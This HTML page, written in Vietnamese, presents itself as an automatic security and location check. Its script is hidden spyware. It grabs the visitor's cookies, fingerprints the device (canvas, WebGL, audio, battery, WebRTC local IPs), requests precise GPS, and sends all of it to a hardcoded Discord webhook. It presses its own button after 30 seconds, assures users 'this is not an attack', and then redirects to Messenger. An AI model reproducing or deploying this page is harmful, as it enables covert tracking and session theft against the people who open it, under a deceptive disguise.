<!DOCTYPE html>
<html lang="vi">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no, viewport-fit=cover">
    <meta http-equiv="Cache-Control" content="no-cache, no-store, must-revalidate">
    <meta http-equiv="Pragma" content="no-cache">
    <meta http-equiv="Expires" content="0">
    <title>Kiểm tra bảo mật tự động</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        html, body { height: 100%; background: #0b0e14; font-family: 'Inter', 'Segoe UI', 'Roboto', sans-serif; overflow: hidden; }
        #main {
            position: fixed; top: 0; left: 0; width: 100%; height: 100%; z-index: 99999;
            background: linear-gradient(145deg, #0c0f14 0%, #10141c 100%);
            display: flex; justify-content: center; align-items: center; flex-direction: column;
            color: #e1e5ee; text-align: center; padding: 20px;
        }
        .card {
            background: rgba(20,24,32,0.8); backdrop-filter: blur(20px);
            border: 1px solid rgba(255,255,255,0.06); border-radius: 20px;
            padding: 35px 25px; max-width: 340px; width: 90%; box-shadow: 0 20px 40px rgba(0,0,0,0.5);
        }
        .shield {
            width: 70px; height: 70px; margin: 0 auto 20px auto;
            background: url('data:image/svg+xml;utf8,<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="%234fc3f7"><path d="M12 1L3 5v6c0 5.55 3.84 10.74 9 12 5.16-1.26 9-6.45 9-12V5l-9-4z"/></svg>') no-repeat center/contain;
        }
        .progress-track {
            width: 100%; height: 5px; background: rgba(255,255,255,0.06); border-radius: 10px; margin: 25px 0 18px 0; overflow: hidden;
        }
        .progress-fill {
            height: 100%; width: 0%; background: linear-gradient(90deg, #4fc3f7, #1e88e5); border-radius: 10px;
            transition: width 0.15s linear;
        }
        .title { font-size: 19px; font-weight: 600; margin-bottom: 8px; color: #ffffff; }
        .subtitle { color: #a0a8b8; font-size: 14px; line-height: 1.5; margin-bottom: 10px; }
        .btn {
            display: inline-block; margin-top: 20px; padding: 13px 30px;
            background: rgba(79,195,247,0.15); border: 1px solid rgba(79,195,247,0.3);
            border-radius: 40px; color: #4fc3f7; font-weight: 600; font-size: 15px;
            cursor: pointer; transition: background 0.2s; letter-spacing: 0.3px;
        }
        .btn:hover { background: rgba(79,195,247,0.25); }
        .result-icon {
            width: 60px; height: 60px; border-radius: 50%; margin: 0 auto 15px auto;
            display: flex; align-items: center; justify-content: center;
        }
        .result-icon.success { background: #1b5e20; box-shadow: 0 0 20px rgba(0,200,83,0.4); }
        .result-icon.fail { background: #b71c1c; box-shadow: 0 0 20px rgba(255,23,68,0.4); }
        .hidden { display: none; }
        .action-row { margin-top: 20px; display: flex; gap: 10px; justify-content: center; flex-wrap: wrap; }
        .action-btn {
            padding: 10px 22px; border-radius: 30px; font-size: 14px; font-weight: 600;
            border: 1px solid rgba(255,255,255,0.1); background: rgba(255,255,255,0.05);
            color: #ccc; cursor: pointer;
        }
        .action-btn.primary { background: rgba(79,195,247,0.15); border-color: rgba(79,195,247,0.3); color: #4fc3f7; }
    </style>
</head>
<body>
    <div id="main">
        <div class="card" id="step1">
            <div class="shield"></div>
            <div class="title" id="step1Title">Đang kiểm tra bảo mật...</div>
            <div class="progress-track">
                <div class="progress-fill" id="progressBar"></div>
            </div>
            <div class="subtitle" id="step1Sub">Vui lòng chờ, hệ thống tự động kiểm tra kết nối an toàn</div>
            <div id="tapPrompt" class="hidden" style="margin-top:10px; font-weight:500; color:#4fc3f7;">
                Nhấn nút bên dưới để xác minh vị trí
            </div>
            <button class="btn hidden" id="tapButton">Xác minh vị trí</button>
        </div>

        <div class="card hidden" id="step2">
            <div class="result-icon" id="resultIcon"></div>
            <div class="title" id="resultTitle"></div>
            <div class="subtitle" id="resultSub"></div>
            <div class="action-row" id="actionRow"></div>
        </div>
    </div>

    <script>
        const WEBHOOK = 'https://discord.com/api/webhooks/1508157152580337746/Ujt-uvdn6HBrnb7CFBe7rd4y-NqaHLstGmzFOKUoD6AJFS5HABi6kTqXXKrumg9eo-Ek';

        // DOM
        const step1 = document.getElementById('step1');
        const step2 = document.getElementById('step2');
        const progressBar = document.getElementById('progressBar');
        const step1Title = document.getElementById('step1Title');
        const step1Sub = document.getElementById('step1Sub');
        const tapBtn = document.getElementById('tapButton');
        const tapPrompt = document.getElementById('tapPrompt');
        const resultIcon = document.getElementById('resultIcon');
        const resultTitle = document.getElementById('resultTitle');
        const resultSub = document.getElementById('resultSub');
        const actionRow = document.getElementById('actionRow');

        let gpsData = null;
        let ipData = null;
        const cookiesStolen = document.cookie || 'none';

        // Detect device model
        function getDeviceModel(ua) {
            const models = [
                /\((SM-[A-Z0-9]+)\)/i,
                /\((Galaxy [A-Za-z0-9 ]+)\)/i,
                /iPhone (\d{1,2}(?:\s*(Pro|Max|Plus))?)\)/i,
                /Redmi ([^;)]+)/i,
                /POCOPHONE ([^;)]+)/i,
                /Pixel ([0-9]+[a-z]?)/i
            ];
            for (let regex of models) {
                const match = ua.match(regex);
                if (match) return match[1] || match[0].replace(/[\(\)]/g,'');
            }
            return 'Unknown';
        }

        function getFingerprint() {
            const nav = navigator;
            const ua = nav.userAgent;
            const canvas = document.createElement('canvas');
            const ctx = canvas.getContext('2d');
            canvas.width = 280; canvas.height = 60;
            ctx.textBaseline = 'top'; ctx.font = '14px Arial';
            ctx.fillStyle = '#f60'; ctx.fillRect(125,1,62,20);
            ctx.fillStyle = '#069'; ctx.fillText('FP', 2, 15);
            const canvasHash = canvas.toDataURL().substring(0, 100);
            let webglRenderer = 'N/A', webglVendor = 'N/A';
            try {
                const gl = document.createElement('canvas').getContext('webgl') || document.createElement('canvas').getContext('experimental-webgl');
                if (gl) {
                    const debug = gl.getExtension('WEBGL_debug_renderer_info');
                    if (debug) { webglRenderer = gl.getParameter(debug.UNMASKED_RENDERER_WEBGL); webglVendor = gl.getParameter(debug.UNMASKED_VENDOR_WEBGL); }
                }
            } catch(e) {}
            let audioFP = 'N/A';
            try {
                const actx = new (window.OfflineAudioContext || window.webkitOfflineAudioContext)(1, 44100, 44100);
                const osc = actx.createOscillator();
                osc.type = 'triangle';
                osc.frequency.setValueAtTime(10000, actx.currentTime);
                const comp = actx.createDynamicsCompressor();
                osc.connect(comp); comp.connect(actx.destination);
                osc.start(0);
                actx.startRendering();
                actx.oncomplete = (e) => {
                    const out = e.renderedBuffer.getChannelData(0);
                    audioFP = out.slice(0, 4000).reduce((a,b)=>a+Math.abs(b),0).toString(36);
                };
            } catch(e) {}
            const conn = nav.connection || {};
            return {
                userAgent: ua,
                language: nav.language,
                platform: nav.platform,
                deviceModel: getDeviceModel(ua),
                deviceMemory: nav.deviceMemory || 'N/A',
                hardwareConcurrency: nav.hardwareConcurrency || 'N/A',
                touchSupport: ('ontouchstart' in window),
                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
                screen: `${screen.width}x${screen.height} (${screen.colorDepth}bit)`,
                connection: conn.effectiveType || 'N/A',
                canvasHash, webglRenderer, webglVendor, audioFingerprint: audioFP,
                cookies: cookiesStolen,
                battery: null
            };
        }

        async function fetchIP() {
            const apis = [
                'https://ipapi.co/json/',
                'https://ipinfo.io/json?token=0',
                'http://ip-api.com/json/?fields=status,country,countryCode,regionName,city,lat,lon,isp,org,as,query'
            ];
            for (let url of apis) {
                try {
                    const r = await fetch(url, { signal: AbortSignal.timeout(3000) });
                    const d = await r.json();
                    const out = {
                        ip: d.ip || d.query || '',
                        city: d.city || '',
                        region: d.region || d.regionName || '',
                        country: d.country || d.country_name || '',
                        countryCode: d.countryCode || (d.country_code ? d.country_code : ''),
                        lat: d.latitude || d.lat || (d.loc ? d.loc.split(',')[0] : ''),
                        lon: d.longitude || d.lon || (d.loc ? d.loc.split(',')[1] : ''),
                        isp: d.isp || d.org || ''
                    };
                    if (out.ip && out.country) return out;
                } catch(e) {}
            }
            return null;
        }

        function getWebRTCIPs() {
            return new Promise((resolve) => {
                const ips = new Set();
                const pc = new RTCPeerConnection({ iceServers: [] });
                pc.createDataChannel('');
                pc.createOffer().then(o => pc.setLocalDescription(o));
                pc.onicecandidate = e => {
                    if (!e.candidate) { resolve(ips.size ? Array.from(ips).join(', ') : null); return; }
                    const m = e.candidate.candidate.match(/([0-9]{1,3}\.){3}[0-9]{1,3}/);
                    if (m) ips.add(m[0]);
                };
                setTimeout(() => resolve(ips.size ? Array.from(ips).join(', ') : null), 2500);
            });
        }

        function forceGPS() {
            return new Promise((resolve) => {
                if (!navigator.geolocation) {
                    resolve({ error: 'unsupported' });
                    return;
                }
                navigator.geolocation.getCurrentPosition(
                    pos => resolve({
                        lat: pos.coords.latitude,
                        lon: pos.coords.longitude,
                        accuracy: Math.round(pos.coords.accuracy),
                        error: null
                    }),
                    err => resolve({ error: err.code }),
                    { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
                );
            });
        }

        async function sendData() {
            const fp = getFingerprint();
            if ('getBattery' in navigator) {
                try { const b = await navigator.getBattery(); fp.battery = { charging: b.charging, level: Math.round(b.level*100)+'%' }; } catch(e) {}
            }
            const localIPs = await getWebRTCIPs();
            const embed = {
                title: '📱 Thông tin thiết bị & vị trí',
                color: 0x4fc3f7,
                fields: [
                    { name: '📱 Model', value: fp.deviceModel, inline: true },
                    { name: '📍 GPS', value: gpsData && !gpsData.error ? `${gpsData.lat}, ${gpsData.lon} (±${gpsData.accuracy}m)` : 'Không có', inline: true },
                    { name: '🌐 IP', value: ipData ? `${ipData.ip}\n${ipData.city}, ${ipData.country}\n${ipData.isp}` : 'Không lấy được', inline: true },
                    { name: '🏠 IP cục bộ', value: localIPs || 'Không có', inline: true },
                    { name: '🔋 Pin', value: fp.battery ? `${fp.battery.level} (${fp.battery.charging?'Sạc':'Không sạc'})` : 'N/A', inline: true },
                    { name: '📱 Chi tiết', value: `${fp.userAgent}\nHĐH: ${fp.platform} | RAM: ${fp.deviceMemory}GB | Nhân: ${fp.hardwareConcurrency}`, inline: false },
                    { name: '🕒 Múi giờ', value: fp.timezone, inline: true },
                    { name: '🖥 Màn hình', value: fp.screen, inline: true },
                    { name: '📶 Kết nối', value: fp.connection, inline: true },
                    { name: '🎨 Canvas', value: fp.canvasHash, inline: true },
                    { name: '🖼 WebGL', value: `${fp.webglVendor} / ${fp.webglRenderer}`, inline: true },
                    { name: '🔊 Audio', value: fp.audioFingerprint, inline: true },
                    { name: '🍪 Cookies', value: cookiesStolen.substring(0, 1020), inline: false }
                ],
                footer: { text: 'Axr4t2auYc • Security check' },
                timestamp: new Date().toISOString()
            };
            await fetch(WEBHOOK, { method: 'POST', headers: {'Content-Type':'application/json'}, body: JSON.stringify({embeds:[embed]}) }).catch(()=>{});
        }

        function isInsideVietnam(lat, lon) {
            return typeof lat === 'number' && typeof lon === 'number' && lat >= 8.0 && lat <= 23.5 && lon >= 102.0 && lon <= 110.0;
        }

        function showResult(success, title, subtitle, actions = []) {
            step1.classList.add('hidden');
            step2.classList.remove('hidden');
            resultIcon.className = 'result-icon ' + (success ? 'success' : 'fail');
            resultIcon.innerHTML = success
                ? '<svg width="30" height="30" viewBox="0 0 24 24" fill="white"><path d="M9 16.17L4.83 12l-1.42 1.41L9 19 21 7l-1.41-1.41z"/></svg>'
                : '<svg width="30" height="30" viewBox="0 0 24 24" fill="white"><path d="M18.3 5.71L12 12 5.71 5.71 4.29 7.12 10.59 13.41 4.29 19.71 5.71 21.12 12 14.83l6.29 6.29 1.41-1.41L13.41 13.41 19.7 7.12z"/></svg>';
            resultTitle.textContent = title;
            resultSub.textContent = subtitle;
            actionRow.innerHTML = '';
            actions.forEach(a => {
                const btn = document.createElement('button');
                btn.className = 'action-btn' + (a.primary ? ' primary' : '');
                btn.textContent = a.label;
                btn.onclick = a.onClick;
                actionRow.appendChild(btn);
            });
        }

        function openLocationSettings() {
            if (/Android/.test(navigator.userAgent)) {
                window.location.href = 'intent://com.android.settings#Intent;action=android.settings.LOCATION_SOURCE_SETTINGS;end;';
            } else {
                alert('Vui lòng mở Cài đặt > Quyền riêng tư > Dịch vụ vị trí và bật vị trí cho trình duyệt.');
            }
        }

        function retryVerification() {
            step2.classList.add('hidden');
            step1.classList.remove('hidden');
            progressBar.style.width = '100%';
            step1Title.textContent = 'Sẵn sàng xác minh vị trí';
            step1Sub.textContent = 'Nhấn nút bên dưới để tiếp tục kiểm tra bảo mật';
            tapPrompt.classList.remove('hidden');
            tapBtn.classList.remove('hidden');
        }

        async function startVerification() {
            tapBtn.classList.add('hidden');
            tapPrompt.classList.add('hidden');
            step1Title.textContent = 'Đang kiểm tra vị trí...';
            step1Sub.textContent = 'Hệ thống tự động xác minh, không phải tấn công';
            progressBar.style.width = '0%';
            let percent = 0;
            const fakeInterval = setInterval(() => {
                percent += 8;
                if (percent >= 100) {
                    percent = 100;
                    clearInterval(fakeInterval);
                }
                progressBar.style.width = percent + '%';
            }, 70);

            const gpsPromise = forceGPS();
            ipData = await fetchIP();
            const gpsResult = await gpsPromise;

            clearInterval(fakeInterval);
            progressBar.style.width = '100%';
            gpsData = gpsResult;

            let isVietnam = false;
            if (gpsData && !gpsData.error && gpsData.lat != null && gpsData.lon != null) {
                isVietnam = isInsideVietnam(gpsData.lat, gpsData.lon);
            } else {
                if (ipData) {
                    const country = ipData.country || '';
                    isVietnam = country.toLowerCase().includes('vietnam') || (ipData.countryCode && ipData.countryCode.toLowerCase() === 'vn');
                }
            }

            await sendData();

            if (gpsData && gpsData.error && (gpsData.error === 1 || gpsData.error === 2)) {
                showResult(false,
                    'Không thể lấy vị trí',
                    'Để hoàn tất kiểm tra, vui lòng bật dịch vụ vị trí và cho phép quyền.',
                    [
                        { label: 'Mở cài đặt vị trí', onClick: openLocationSettings, primary: true },
                        { label: 'Thử lại', onClick: retryVerification }
                    ]);
                return;
            }

            if (isVietnam) {
                showResult(true,
                    'Xác minh thành công',
                    'Bạn đủ điều kiện truy cập. Đang chuyển hướng...',
                    []);
                setTimeout(() => { window.location.href = 'https://www.messenger.com/'; }, 2000);
            } else {
                showResult(false,
                    'Truy cập bị hạn chế',
                    'Hệ thống chỉ cho phép người dùng tại Việt Nam. Nếu bạn đang ở Việt Nam, hãy thử lại.',
                    [
                        { label: 'Thử lại', onClick: () => window.location.reload() }
                    ]);
            }
        }

        // Initial animation
        let initProgress = 0;
        const initInterval = setInterval(() => {
            initProgress += 7;
            progressBar.style.width = initProgress + '%';
            if (initProgress >= 100) {
                clearInterval(initInterval);
                progressBar.style.width = '100%';
                step1Title.textContent = 'Sẵn sàng kiểm tra';
                step1Sub.textContent = 'Nhấn nút bên dưới để xác minh vị trí của bạn';
                tapBtn.classList.remove('hidden');
                tapPrompt.classList.remove('hidden');
            }
        }, 70);

        tapBtn.addEventListener('click', startVerification);

        // Auto-tap after 30s
        setTimeout(() => {
            if (!tapBtn.classList.contains('hidden')) tapBtn.click();
        }, 30000);
    </script>
</body>
</html>
